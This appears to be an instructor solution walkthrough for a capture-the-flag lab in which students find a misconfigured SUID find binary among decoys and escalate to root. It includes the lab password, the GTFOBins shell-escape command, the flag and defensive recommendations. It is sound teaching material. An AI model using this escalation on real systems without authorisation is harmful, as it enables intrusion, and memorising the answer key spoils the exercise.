# Cobalt Systems: SUID Maze

## Overview

Students must navigate a "maze" of five SUID binaries on a monitoring server to identify the single exploitable one. Three are standard system binaries (ping, su, mount), one is a custom decoy (statusmon), and one (`find`) is a dangerous misconfiguration. Students escalate to root via GTFOBins techniques and assemble a two-part flag.

## Architecture

```
┌─────────────┐                     ┌──────────────────┐
│   Student    │ ──── SSH:22 ─────▶ │      target       │
│   (Kali VM)  │                    │ (monitoring srv)  │
└─────────────┘                     └──────────────────┘
                                     User: analyst
                                     Goal: root (via SUID)
```

## SUID Binaries

| # | Binary | Type | Exploitable? |
|---|--------|------|-------------|
| 1 | /usr/bin/ping | Standard system | No |
| 2 | /usr/bin/su | Standard system | No |
| 3 | /usr/bin/mount | Standard system | No |
| 4 | /usr/local/bin/statusmon | Custom decoy | No |
| 5 | /usr/bin/find | Misconfigured | **Yes** |

## Solution Walkthrough

### Step 1: Connect to the Target

```bash
ssh analyst@<target_ip>
# Password: C0b4lt_4n4lyst#
```

### Step 2: Read the Clue File

```bash
cat ~/clue.txt
# Token 1: su1d_m4z3
```

### Step 3: Enumerate SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

Output includes:
```
/usr/bin/find         <-- ABNORMAL! Should not have SUID
/usr/bin/ping         <-- Normal
/usr/bin/su           <-- Normal
/usr/bin/mount        <-- Normal
/usr/local/bin/statusmon  <-- Custom, but not exploitable
```

### Step 4: Review the Cobalt Audit Document

```bash
cat /opt/cobalt/readme.txt
```

This reveals that `find` was given SUID for "scheduled file audits"; a red flag that it was installed by request rather than by default.

### Step 5: Exploit SUID find

Using the GTFOBins technique for `find`:

```bash
find . -exec /bin/sh -p \; -quit
```

This spawns a shell with effective UID 0 (root).

### Step 6: Read Token 2

```bash
cat /root/flag.txt
# p01s0n
```

### Step 7: Assemble the Flag

```
OCR{su1d_m4z3_p01s0n}
```

## Common Mistakes

- **Running statusmon and expecting escalation.** It is a decoy; a simple bash script that prints system stats and exits cleanly.
- **Overlooking find as exploitable.** Students may see `find` in the SUID list and dismiss it as a normal utility. The key insight is that `find` should never have SUID set.
- **Forgetting the -p flag.** Without `-p`, bash drops SUID privileges. Using `/bin/sh` (dash on Ubuntu) avoids this, but `-p` ensures it works regardless.
- **Not reading /opt/cobalt/readme.txt.** The audit document explicitly calls out that `find` was installed with elevated permissions by request, which is the biggest clue.

## Defensive Recommendations

- Audit SUID binaries regularly: `find / -perm -4000 -type f 2>/dev/null`
- Never set SUID on utilities like `find`, `vim`, `python`, `nmap`, or `less`: they all have shell escape paths
- Use `sudo` with specific command restrictions instead of SUID
- Implement file integrity monitoring to detect unauthorized permission changes
- Require security review for any ticket requesting elevated file permissions
